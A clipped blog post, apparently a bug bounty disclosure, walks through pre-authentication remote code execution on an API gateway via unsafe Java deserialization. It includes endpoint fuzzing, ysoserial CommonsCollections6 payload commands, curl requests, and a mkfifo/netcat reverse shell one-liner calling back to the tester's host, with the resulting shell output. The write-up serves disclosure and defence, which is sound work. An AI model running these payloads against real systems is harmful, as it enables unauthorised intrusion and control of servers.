---
title: "When The Gateway Becomes The Doorway: Pre-Auth RCE in API Management"
source: https://principlebreach.com/lab/when-the-gateway-becomes-the-doorway-pre-auth-rce-in-api-management
author:
  - Principle Breach
published: 2026-01-18
created: 2026-01-22
description: Discover how a decade-old vulnerability class leads to pre-authentication Remote Code Execution (RCE) in an enterprise API management platform. This article details the end-to-end compromise of an API Gateway, from initial subdomain reconnaissance and API fuzzing to achieving an interactive reverse shell via unsafe Java deserialization in unauthenticated cluster sync endpoints.
tags:
  - clippings/articles
  - _inbox
  - Java
  - deserialization/java
---
# When The Gateway Becomes The Doorway: Pre-Auth RCE in API Management

![](https://principlebreach.com/api/og?title=When+The+Gateway+Becomes+The+Doorway%3A+Pre-Auth+RCE+in+API+Management&subtitle=Discover+how+a+decade-old+vulnerability+class+leads+to+pre-authentication+Remote+Code+Execution+%28RCE%29+in+an+enterprise+API+management+platform.+This+article+details+the+end-to-end+compromise+of+an+API+Gateway%2C+from+initial+subdomain+reconnaissance+and+API+fuzzing+to+achieving+an+interactive+reverse+shell+via+unsafe+Java+deserialization+in+unauthenticated+cluster+sync+endpoints.)

> [!summary]
> > This article details a pre-authentication Remote Code Execution (RCE) vulnerability discovered in an enterprise API management platform during a bug bounty engagement. The attack chain involved:
> 1. Subdomain enumeration revealing `gateway-internal.target.com`, a custom API gateway.
> 2. Technology fingerprinting identifying Spring Boot (Java).
> 3. API path fuzzing uncovering unauthenticated `/api/v1/cluster/sync` and `/api/v1/cluster/status` endpoints.
> 4. Probing the `/api/v1/cluster/sync` endpoint with Base64-encoded data, which revealed a `java.lang.ClassCastException` and the full class name `com.gatewayeu.core.cluster.ClusterState`.
> 5. Confirming insecure Java deserialization because deserialization occurred *before* the type check.
> 6. Exploiting the vulnerability using YsoSerial with the Commons Collections 6 gadget chain to achieve pre-authenticated RCE, demonstrated via an out-of-band (OOB) interaction and then an interactive reverse shell.
> The vulnerability was due to public exposure of administrative interfaces, missing authentication on internal endpoints, verbose error messages, and potentially outdated dependencies. A hotfix and full patch were deployed, and public disclosure occurred on Jan 18, 2026.

Technology Fingerprinting

A few HTTP headers later, the picture became clearer:

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
X-Powered-By: Spring Boot
Content-Type: text/html;charset=UTF-8
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly
```

Spring Boot. Java. Our interest intensified :)

The application's error pages were particularly generous:

```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.

Thu Jan 10 23:23:45 UTC 2026

There was an unexpected error (type=Not Found, status=404).
```

A Whitelabel error page, Spring Boot's default. The developers hadn't bothered to customize it.

This level of attention to detail (or lack thereof) often correlates with other oversights.

API Reconnaissance

Unauthenticated Endpoint Discovery

`$ ffuf -u https://gateway-internal.target.com/FUZZ -w ${WORDLISTS}/api-endpoints.txt -mc 200,301,302,401,403,405,500,502  ________________________________________________  :: Method : GET :: URL : https://gateway-internal.target.com/FUZZ  ________________________________________________  actuator [Status: 403] actuator/health [Status: 403] actuator/info [Status: 403] api [Status: 401] api/v1 [Status: 401] api/v1/routes [Status: 401] api/v1/cluster [Status: 200] <- Interesting api/v1/cluster/sync [Status: 405] api/v1/cluster/status [Status: 200]`

endpoints returned 401, requiring authentication. But the cluster-related endpoints? Those returned 200.

```
GET /api/v1/cluster/status HTTP/1.1
Host: gateway-internal.target.com
```

```
{
"status": "healthy",
"nodeId": "gw-node-e34ab4b2-eu",
"clusterSize": 3,
"lastSync": "2026-01-16T14:20:00Z",
"syncEnabled": true,
"version": "4.2.1"
}
```

A cluster synchronization feature. In distributed systems, cluster sync typically involves serializing state and transmitting it between nodes.

```
POST /api/v1/cluster/sync HTTP/1.1
Host: gateway-internal.target.com
Content-Type: application/json
Content-Length: 2
{}
```

```
{
    "error": "Invalid sync payload",
    "message": "Expected serialized ClusterState object",
    "code": "SYNC_INVALID_PAYLOAD"
}
```

"Expected serialized ClusterState object."

At this point, we suspected Java serialization. But suspicion isn't evidence. We needed confirmation.

Identifying the Vulnerability

Probing the Serialization Format

The error message mentioned "serialized" but didn't specify the format. Java applications commonly use:

- Native Java serialization (ObjectInputStream)
- JSON (Jackson, Gson)
- XML (XMLDecoder, XStream)

We started with JSON, but received the same error. Then we tried sending Base64-encoded data directly:

```
POST /api/v1/cluster/sync HTTP/1.1
Host: gateway-internal.target.com
Content-Type: application/octet-stream

rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AAR0ZXN0
```

```
{
"error": "Deserialization failed",
"message": "java.lang.ClassCastException: [Ljava.lang.String; cannot be cast to com.gatewayeu.core.cluster.ClusterState",
"code": "SYNC_DESERIALIZE_ERROR"
}
```

Bingo. Several things happened at once:

1. The server accepted our Base64-encoded serialized data
2. It attempted to deserialize it as a `ClusterState` object
3. The error reveals the full class name: `com.gatewayeu.core.cluster.ClusterState`
4. Most importantly: **deserialization occurred before the type check**

If the application had validated the type before deserializing, we would have received a different error. The fact that it tried to cast our String array to ClusterState means the object was already instantiated.

### Proof of Concept: File Creation

```
java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
--add-opens java.base/java.lang=ALL-UNNAMED \
--add-opens java.base/java.util=ALL-UNNAMED \
--add-opens java.management/javax.management=ALL-UNNAMED \
-jar $YSOSERIAL_JAR CommonsCollections6 \
'ping OUR_INFRA_' | base64 -w0 > oob.txt

# fire!

curl -X POST https://gateway-internal.target.com/api/v1/cluster/sync \
-H "Content-Type: application/octet-stream" \
--data-binary @oob.txt

{"error":"Deserialization failed","message":"java.lang.ClassCastException..."}
```

The server returned an error (expected, our gadget chain doesn't produce a ClusterState), but did our command execute? We checked our servers and indeed out-of-band interactions received (maybe it's time for a sweet reverse shell? to confirm this RCE).

As final showdown, we tried to get a interactive reverse shell on gateway via mkfifo technique:

```
java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
--add-opens java.base/java.lang=ALL-UNNAMED \
--add-opens java.base/java.util=ALL-UNNAMED \
--add-opens java.management/javax.management=ALL-UNNAMED \
-jar $YSOSERIAL_JAR CommonsCollections6 \
'sh -c $@|sh . echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc OUR_INFRA_IP 4444 >/tmp/f' \
| base64 -w0 > pwn.txt
```

```
curl -isk -X POST --data-binary @pwn.txt -H 'Content-Type: application/octet-stream' https://gateway-internal.target.com/api/v1/cluster/sync
```

```
{"error":"Deserialization failed","message":"java.lang.ClassCastException: java.util.HashSet cannot be cast to com.gatewayeu.core.cluster.ClusterState","code":"SYNC_DESERIALIZE_ERROR"}
```

```
ncat -lvnp 4444
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from TARGET_COM_IP:62543.
sh: 0: can't access tty; job control turned off
$ whoami
gatewayeu
$ hostname
gw-node-eu
```